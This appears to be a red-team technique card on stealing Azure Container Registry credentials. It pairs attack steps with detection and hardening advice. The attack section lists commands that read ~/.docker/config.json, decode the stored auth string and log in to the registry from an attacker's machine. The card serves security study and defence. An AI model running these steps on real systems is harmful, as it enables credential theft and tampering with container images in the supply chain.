# [CA-TOKEN-014]: Container Registry Token Theft

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-014 |
| **MITRE ATT&CK v18.1** | [Unsecured Credentials: Container API (T1552.007)](https://attack.mitre.org/techniques/T1552/007/) |
| **Tactic** | Credential Access |
| **Platforms** | Azure Container Registry (ACR) |
| **Severity** | **Medium** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Docker clients store authentication tokens in `~/.docker/config.json`. These can be base64-encoded credentials (basic auth) or identity tokens. In Azure, `az acr login` creates an entry here. If an attacker accesses a developer workstation or build server, they can steal this file to pull/push images to the private registry.
- **Attack Surface:** Developer Workstation / CI Server.
- **Business Impact:** **Supply Chain Attack**. Injecting malicious layers into container images.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Read access to home directory.
- **Tools:** `cat`, `docker`

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Extraction**
```bash
cat ~/.docker/config.json
```

**Step 2: Decode**
Decode the `auth` string (user:pass).
```bash
echo "dXNlcjpwYXNzd29yZA==" | base64 -d
```

**Step 3: Abuse**
Login from attacker machine.
```bash
docker login myregistry.azurecr.io -u <User> -p <Pass>
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 ACR Logs
| Source | Event | Filter Logic |
|---|---|---|
| **ContainerRegistry** | `Pull` / `Push` | Access from an unknown IP using valid credentials. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Cred Helper:** Use `docker-credential-helper` (e.g., `docker-credential-wincred`) which stores secrets in the OS keyring instead of plain text in JSON.
*   **Disable Admin User:** Disable the "Admin User" (username/password) feature on ACR and rely solely on Entra ID RBAC (`AcrPull`/`AcrPush`).

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-EXPLOIT-004]
> **Next Logical Step:** [LAT-SUPPLY-001]
